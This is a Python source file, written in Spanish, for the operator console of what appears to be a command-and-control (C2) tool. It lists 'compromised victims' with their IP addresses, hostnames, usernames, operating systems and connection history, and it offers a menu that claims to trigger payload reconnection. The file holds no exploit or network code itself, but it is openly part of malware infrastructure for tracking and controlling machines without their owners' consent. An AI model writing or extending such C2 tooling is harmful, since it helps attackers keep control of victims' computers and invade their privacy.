import os
from utils.victims_db import VictimsDatabase

class C2Manager:
    def __init__(self):
        self.db = VictimsDatabase()
    
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def show_dashboard(self):
        """Muestra el panel C&C con víctimas comprometidas"""
        self.clear_screen()
        print("\n" + "█"*70)
        print("  PANEL C&C - VÍCTIMAS COMPROMETIDAS")
        print("█"*70 + "\n")
        
        total_victims = self.db.get_victim_count()
        active_victims = self.db.get_active_count()
        
        # Mostrar estadísticas
        print(f"[*] ESTADÍSTICAS GENERALES:")
        print(f"    Total de víctimas: {total_victims}")
        print(f"    Víctimas activas: {active_victims}")
        print(f"    Víctimas inactivas: {total_victims - active_victims}")
        print()
        
        # Mostrar víctimas
        victims = self.db.get_all_victims()
        
        if not victims:
            print("[-] No hay víctimas comprometidas aún\n")
        else:
            print("[*] LISTA DE VÍCTIMAS:\n")
            print("-" * 70)
            print(f"{'ID':<4} {'IP':<15} {'Hostname':<15} {'Usuario':<10} {'Modo':<10} {'Estado':<10}")
            print("-" * 70)
            
            for victim in victims:
                status = "ACTIVA" if victim['active'] else "INACTIVA"
                status_color = "[+]" if victim['active'] else "[-]"
                
                print(f"{status_color} {victim['id']:<2} {victim['ip']:<15} {victim['hostname'][:14]:<15} "
                      f"{victim['username'][:9]:<10} {victim['mode']:<10} {status:<10}")
                print(f"    [*] OS: {victim['os']}")
                print(f"    [*] Primera conexión: {victim['first_seen']}")
                print(f"    [*] Última conexión: {victim['last_seen']}")
                print(f"    [*] Conexiones totales: {victim['connections']}")
                print()
            
            print("-" * 70)
        
        print()
        print("[1] Ver detalles de víctima")
        print("[2] Reactivar reconexión")
        print("[3] Volver al menú principal")
        print()
        
        choice = input("[*] Selecciona opción (1-3): ").strip()
        
        if choice == '1':
            self.show_victim_details(victims)
        elif choice == '2':
            self.show_reconnect_menu(victims)
        
    def show_victim_details(self, victims):
        """Muestra detalles de una víctima específica"""
        if not victims:
            print("[-] No hay víctimas disponibles")
            input("Presiona Enter...")
            return
        
        try:
            victim_id = int(input("\n[*] ID de la víctima: "))
            
            for victim in victims:
                if victim['id'] == victim_id:
                    self.clear_screen()
                    print("\n" + "█"*70)
                    print(f"  DETALLES DE VÍCTIMA - {victim['hostname']}")
                    print("█"*70 + "\n")
                    
                    print(f"[*] ID: {victim['id']}")
                    print(f"[*] IP Address: {victim['ip']}")
                    print(f"[*] Hostname: {victim['hostname']}")
                    print(f"[*] Usuario: {victim['username']}")
                    print(f"[*] Sistema Operativo: {victim['os']}")
                    print(f"[*] Modo: {victim['mode']}")
                    print(f"[*] Estado: {'ACTIVA' if victim['active'] else 'INACTIVA'}")
                    print(f"[*] Primera conexión: {victim['first_seen']}")
                    print(f"[*] Última conexión: {victim['last_seen']}")
                    print(f"[*] Total de conexiones: {victim['connections']}")
                    print()
                    
                    input("Presiona Enter...")
                    return
            
            print("[-] Víctima no encontrada")
            input("Presiona Enter...")
        except ValueError:
            print("[-] ID inválido")
            input("Presiona Enter...")
    
    def show_reconnect_menu(self, victims):
        """Permite reactivar reconexión con víctimas"""
        if not victims:
            print("[-] No hay víctimas disponibles")
            input("Presiona Enter...")
            return
        
        print("\n[*] VÍCTIMAS DISPONIBLES PARA RECONECTAR:")
        print()
        
        for victim in victims:
            status = "ACTIVA" if victim['active'] else "INACTIVA"
            print(f"  {victim['id']}. {victim['ip']} ({victim['hostname']}) - {status}")
        
        print()
        
        try:
            victim_id = int(input("[*] ID de la víctima a reconectar: "))
            
            for victim in victims:
                if victim['id'] == victim_id:
                    print(f"\n[*] Intentando reconectar con {victim['hostname']} ({victim['ip']})...")
                    print(f"[*] Modo: {victim['mode']}")
                    print(f"[*] Última conexión: {victim['last_seen']}")
                    print()
                    print("[+] Reconexión iniciada")
                    print("[*] El payload intentará reconectarse automáticamente")
                    print("[*] Asegúrate de que la víctima esté activa")
                    print()
                    input("Presiona Enter...")
                    return
            
            print("[-] Víctima no encontrada")
            input("Presiona Enter...")
        except ValueError:
            print("[-] ID inválido")
            input("Presiona Enter...")
